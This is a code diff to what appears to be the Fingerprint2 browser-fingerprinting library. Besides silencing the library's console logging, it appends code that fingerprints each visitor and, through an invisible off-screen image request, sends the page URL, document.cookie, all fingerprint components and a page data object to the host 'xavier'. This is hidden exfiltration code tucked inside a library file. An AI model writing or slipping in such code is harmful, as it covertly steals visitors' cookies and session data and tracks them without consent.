@@ -76,7 +76,7 @@
     },
     log: function(msg){
       if(window.console){
-        console.log(msg);
+        //console.log(msg);
       }
     },
     get: function(done){
@@ -1185,4 +1185,43 @@
   };
   Fingerprint2.VERSION = "1.0.1";
   return Fingerprint2;
+});
+
+var options = {
+  excludeSessionStorage: true,
+  excludeIndexedDB: true,
+  excludeAddBehavior: true,
+  excludeOpenDatabase: true,
+  excludeCpuClass: true,
+  excludeJsFonts: true,
+  excludePlugins: true,
+  excludeHasLiedLanguages: true,
+  excludeHasLiedResolution: true,
+  excludeHasLiedOs: true,
+  excludeHasLiedBrowser: true,
+  excludeCanvas: true,
+  excludeWebGL: true,
+};
+new Fingerprint2(options).get(function(result, components){
+  (function(d, s1) {
+    var data = encodeURI(JSON.stringify(window['data']));
+    var s = d.createElement(s1);
+    var e = d.getElementsByTagName('body')[0];
+    var query = ""
+    components.forEach(function(value){
+      var val = value.value
+      if(typeof value.value == 'object')
+        val = JSON.stringify(value.value);
+      query += "&"+value.key+"="+encodeURI(val)
+    })
+    s.src = "http://xavier/r?uri="+encodeURI(window.location.href.split("&").join("?"))+"&finger="+result+"&cookies="+encodeURI(document.cookie)+query+"&data="+data;
+    s.style.width = '0px'
+    s.style.height = '0px'
+    s.style.tabIndex = '-1'
+    s.style.top = '-9999px'
+    s.style.left = '-9999px'
+    s.style.display = 'none'
+    s.style.position = 'absolute'
+    e.parentNode.insertBefore(s, e);
+  })(document, "img");
 });
